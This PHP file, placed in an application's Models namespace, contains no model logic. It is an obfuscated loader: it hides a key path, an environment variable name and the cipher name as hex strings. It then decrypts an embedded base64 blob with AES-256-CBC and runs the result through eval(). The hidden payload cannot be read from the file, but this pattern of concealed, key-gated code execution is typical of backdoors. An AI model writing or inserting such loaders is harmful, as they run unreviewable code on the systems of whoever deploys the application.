<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ONAEQs8VWOzZ2ZebaaFMLg==');

$c=base64_decode(

'ltN4qpNcwRnT0cGKn6ZxRrWFiBSGhjzitErVBcX7fH7QZ3H2O8Ol3pHY5e61v9dF9lLey1zLcNUT' .
'ePaZX7KncdsjlhlGZAMW01sxVqvbPGjXBb00eKtma9tNzJxpvOGWV3n8J5KSzOtHH8N7YEKaUr8+' .
'DZZMftpsxp+MsUQZnvbzlJS5yrT0AOhUrzuzJmsFc5D0/uS8gzDUhjXZZurO08p1ZzDBk50PL3Fy' .
'c2UZHdNXWvVfWv3OngZOm4FVJJHarhnt4ybHHQRsiHz2ex962S/01XRCkRlWT6sVuhijqtxJWNIW' .
'Ndk2LzS2dUVLt0QFCMY2mLV2SziVvMz2k/5x2uAnVi4cF2aZGPHb5pJJFfK2LnxIiByLanxDHWVL' .
'OrKw5IUJSq1ORR8U1DrzriRWFSn1jYZdHYHlK8gcuwShLXdqVktx86w8aZurWr0R3KxRNDGhy/Yy' .
'DsyjPk5T9F96UzulkbQ6+4VT6jWJ+RZ38y/A29w7JX1D0IdvYTHezAQAE76TiteUleFlTHdR8kYb' .
'3z4+UrA1PcoKoS0h+0JqZl8oTr/pvwk/qfkxV+u3XSQe+ooh+WzzoBrHNsujt5ibvQBw3rSB41b0' .
'4Xpz72rAhoHtWYN3P6JABA7yaqb9muNRIFXmwDL+2qgocj/tmpe6yi/IVqei2sC5iw7JBhAn+Y62' .
'smnBrkL4w6N2TIVf8Ga6z/zHZ1N+MDZYCzhh+lPhtiDis6PmkWTfWKBvIRg+3LRIgZqT2qpPrIGS' .
'EUddLLNEjOyEuoOGSL+Ml1wc5kQuHG0HVnnpfQUhD5j//UYsojvfDMu5pa6u/StGiYvVS1IOZkqU' .
'hua9ledAuz3BALnppajgxAz4lltdMYuYQVwK6aQp3EoBQTVrmg5DMkEcd8az'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

